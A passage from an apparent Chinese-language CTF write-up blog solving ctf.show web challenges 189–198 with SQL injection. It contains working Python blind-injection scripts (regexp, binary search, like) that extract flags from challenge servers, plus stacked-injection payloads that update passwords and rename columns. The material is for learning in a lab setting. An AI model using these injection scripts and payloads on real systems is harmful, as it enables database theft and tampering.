+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: k1he</span></span><br><span class="line"><span class="comment"># @Date:   2021-09-18 20:25:26</span></span><br><span class="line"><span class="comment"># @Last Modified by:   k1he</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2021-09-19 15:55:45</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url =<span class="string">&quot;http://672fae7a-35db-4eca-8187-c6d1bcd4d481.challenge.ctf.show:8080/api/index.php&quot;</span></span><br><span class="line">flag = <span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line">letter = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">60</span>):  <span class="comment">#此处可适当调大</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> letter:</span><br><span class="line">        temp_flag = flag+j</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;if(load_file(&#x27;/var/www/html/api/index.php&#x27;)regexp(&#x27;&#123;&#125;&#x27;),0,1)#&quot;</span>.<span class="built_in">format</span>(temp_flag),</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        <span class="comment">#print(data[&#x27;username&#x27;])</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> <span class="keyword">in</span> r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"><span class="comment">#ctfshow&#123;335a466f-e9f5-4840-9e17-eefddd2eed9e&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>这里还学到一点就是返回的是json的时候该怎么处理。</p>
+<h2 id="web-190-json类型盲注"><a href="#web-190-json类型盲注" class="headerlink" title="web 190(json类型盲注)"></a>web 190(json类型盲注)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//密码检测</span></span><br><span class="line">  <span class="keyword">if</span>(!is_numeric(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(json_encode(<span class="variable">$ret</span>));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//密码判断</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p>测试了一下，本题多了一个用户名判断。应该是强比较判断。盲注。</p>
+<p>这里手工测试一下，很容易发现用户名处存在盲注。</p>
+<p>只存在”密码错误”和”用户名不存在”。当我们用户名处成功注入时返回密码错误。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: k1he</span></span><br><span class="line"><span class="comment"># @Date:   2021-09-18 21:01:32</span></span><br><span class="line"><span class="comment"># @Last Modified by:   k1he</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2021-09-19 15:25:03</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://ec825111-5f1a-434e-832f-7c2c48c558ed.challenge.ctf.show:8080/api/&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="built_in">max</span> = <span class="number">127</span></span><br><span class="line">    <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        mid = (<span class="built_in">max</span>+<span class="built_in">min</span>)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">min</span> == mid):</span><br><span class="line">            flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_fl0g</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#id,f1ag</span></span><br><span class="line">        payload = <span class="string">&quot;admin&#x27;and (ascii(substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url = url,data =data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> == res.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            <span class="built_in">max</span> = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">min</span> = mid </span><br><span class="line"><span class="comment">#ctfshow&#123;41c6d58b-1795-41ba-8d5d-56be249791aa&#125; </span></span><br></pre></td></tr></table></figure>
+
+<h2 id="web-191-过滤ascii"><a href="#web-191-过滤ascii" class="headerlink" title="web 191(过滤ascii)"></a>web 191(过滤ascii)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/file|into|ascii/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(json_encode(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>增加了盲注过滤。没什么影响。ascii用ord替换。脚本一把梭哈。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: k1he</span></span><br><span class="line"><span class="comment"># @Date:   2021-09-18 20:25:26</span></span><br><span class="line"><span class="comment"># @Last Modified by:   k1he</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2021-09-19 16:22:24</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url =<span class="string">&quot;http://9a8a7166-7150-4c7a-98ef-d4da2ef7781b.challenge.ctf.show:8080/api/&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="built_in">max</span> = <span class="number">127</span></span><br><span class="line">    <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        mid = (<span class="built_in">max</span>+<span class="built_in">min</span>)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(mid == <span class="built_in">min</span>):</span><br><span class="line">            flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">chr</span>(mid)==<span class="string">&quot;&#123;&quot;</span>):</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and ascii(substr((select database()),&#123;&#125;,1))&gt;&#123;&#125;#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and ord(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;&#123;&#125;#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_fl0g</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and ord(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;&#125;,1))&lt;&#123;&#125;#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#id,f1ag</span></span><br><span class="line">        payload = <span class="string">&quot;admin&#x27;and ord(substr((select group_concat(f1ag) from ctfshow_fl0g),&#123;&#125;,1))&lt;&#123;&#125;#&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url=url,data=data)</span><br><span class="line">        <span class="comment">#print(res.text)</span></span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> <span class="keyword">in</span> res.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            <span class="built_in">max</span> = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">min</span> = mid</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="web-192-正则截断注入"><a href="#web-192-正则截断注入" class="headerlink" title="web 192(正则截断注入)"></a>web 192(正则截断注入)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; and if(substr((select group_concat(f1ag) from ctfshow_fl0g),&#123;i&#125;,1)regexp(&#x27;</span>&#123;j&#125;<span class="string">&#x27;),1,2)=&#x27;</span><span class="number">1</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: k1he</span></span><br><span class="line"><span class="comment"># @Date:   2021-09-18 20:25:26</span></span><br><span class="line"><span class="comment"># @Last Modified by:   k1he</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2021-09-19 16:51:22</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url =<span class="string">&quot;http://a64eba92-a4e4-4b96-b11d-d5ad34cce45b.challenge.ctf.show:8080/api/&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">letter = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">60</span>):  <span class="comment">#此处可适当调大</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> letter:</span><br><span class="line">        temp_flag = flag+j</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&#x27;and if(substr((select group_concat(f1ag) from ctfshow_fl0g where f1ag regexp(&#x27;ctfshow&#x27;)),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,0,1)#&quot;</span>.<span class="built_in">format</span>(i,j),</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        <span class="comment">#print(data[&#x27;username&#x27;])</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;用户名不存在&quot;</span> <span class="keyword">in</span> r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"><span class="comment">#ctfshow&#123;da178f3e-bfd6-42dc-89a8-f507be312c6f&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="web-193-194-like注入"><a href="#web-193-194-like注入" class="headerlink" title="web 193-194(like注入)"></a>web 193-194(like注入)</h2><p>讲道理这里的话上一题的Payload将substr换成mid就能用了。但是不知道为什么没打通。</p>
+<p>选择了抄师傅们的脚本。这里用的是like注入。但是好像like注入确实比regexp注入好理解。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: k1he</span></span><br><span class="line"><span class="comment"># @Date:   2021-09-18 20:25:26</span></span><br><span class="line"><span class="comment"># @Last Modified by:   k1he</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2021-09-19 18:39:19</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://40ebd4e2-e4d3-41d1-80e7-421bc0d3dc26.challenge.ctf.show:8080/api/&#x27;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">letter = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-,&#123;&#125;_&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> letter:</span><br><span class="line">        <span class="comment">#payload=&quot;admin&#x27; and if((select group_concat(table_name) from information_schema.tables where table_schema=database()) like &#x27;&#123;&#125;&#x27;,1,0)#&quot;.format(flag+j+&quot;%&quot;)</span></span><br><span class="line">        <span class="comment">#ctfshow_flxg</span></span><br><span class="line">        <span class="comment">#payload=&quot;admin&#x27; and if((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flxg&#x27;) like &#x27;&#123;&#125;&#x27;,1,0)#&quot;.format(flag+j+&quot;%&quot;)</span></span><br><span class="line">        <span class="comment">#id,f1ag</span></span><br><span class="line">        payload=<span class="string">&quot;admin&#x27; and if((select group_concat(f1ag) from ctfshow_flxg) like &#x27;&#123;&#125;&#x27;,1,0)-- -&quot;</span>.<span class="built_in">format</span>(flag+j+<span class="string">&quot;%&quot;</span>)</span><br><span class="line">        <span class="comment">#ctfshow&#123;7259adb9-4f34-4c72-bbeb-0fd74517cd3c&#125;</span></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>:payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>:<span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        r=requests.post(url=url,data=data)</span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> <span class="keyword">in</span> r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> j==<span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="web-195-堆叠注入-反单引号"><a href="#web-195-堆叠注入-反单引号" class="headerlink" title="web 195(堆叠注入-反单引号)"></a>web 195(堆叠注入-反单引号)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//密码检测</span></span><br><span class="line"><span class="keyword">if</span>(!is_numeric(<span class="variable">$password</span>))&#123;</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">  <span class="keyword">die</span>(json_encode(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码判断</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\&#x27;|\&quot;|select|union|or|and|\x26|\x7c|file|into/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">  <span class="keyword">die</span>(json_encode(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="number">0</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;登陆成功 flag is <span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p>这里开启堆叠注入了。堆叠注入不是很理解。只能边看WP边学了。</p>
+<p>堆叠注入的核心就是可以执行多个语句。</p>
+<p>那么这里我们并不知道密码，可以利用堆叠注入进行一个更改密码的语句执行。</p>
+<p>之前我一直以为反单引号内部代表表名。后面查了一下，反单引号用于区分保留字。</p>
+<p>对于本题也就是<code>pass</code>代表pass字段。`</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">username:<span class="number">0</span>;update`ctfshow_user`<span class="built_in">set</span>`<span class="keyword">pass</span>`=<span class="number">1</span>;</span><br><span class="line">password:<span class="number">1</span></span><br><span class="line"></span><br><span class="line">点两下登陆就行了。</span><br></pre></td></tr></table></figure>
+
+<h2 id="web-196-堆叠注入-限制长度"><a href="#web-196-堆叠注入-限制长度" class="headerlink" title="web 196(堆叠注入-限制长度)"></a>web 196(堆叠注入-限制长度)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\&#x27;|\&quot;|select|union|or|and|\x26|\x7c|file|into/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">  <span class="keyword">die</span>(json_encode(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$username</span>)&gt;<span class="number">16</span>)&#123;</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名不能超过16个字符&#x27;</span>;</span><br><span class="line">  <span class="keyword">die</span>(json_encode(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="number">0</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;登陆成功 flag is <span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+
+
+<p>这里目前还没问到预期解。。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">据说这题没有ban select。但是正则里面确实写了ban select。问了下群主，忘了ban select....</span><br><span class="line"></span><br><span class="line">因此这里是非预期：</span><br><span class="line">payload:</span><br><span class="line">username:<span class="number">0</span>;select(<span class="number">1</span>);</span><br><span class="line">password:<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img "" class="lazyload placeholder" data-original="https://i.loli.net/2021/09/19/UJrVQihSEH8NFsg.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"></p>
+<h2 id="web-197-198-堆叠注入-更改列名"><a href="#web-197-198-堆叠注入-更改列名" class="headerlink" title="web 197-198(堆叠注入-更改列名)"></a>web 197-198(堆叠注入-更改列名)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;/\*|\#|\-|\x23|\&#x27;|\&quot;|union|or|and|\x26|\x7c|file|into|select|update|set//i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">  <span class="keyword">die</span>(json_encode(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="number">0</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;登陆成功 flag is <span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>这里可以看出没有了update我们无法更改密码了。但是这个判断的话我们可以通过将pass字段和id字段互换。进而通过爆破id就能拿到flag。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">paylaod:</span><br><span class="line">username:<span class="number">0</span>;alter table `ctfshow_user` change `<span class="keyword">pass</span>` `k1he` varchar(<span class="number">255</span>); alter table `ctfshow_user` change `<span class="built_in">id</span>` `<span class="keyword">pass</span>` varchar(<span class="number">255</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
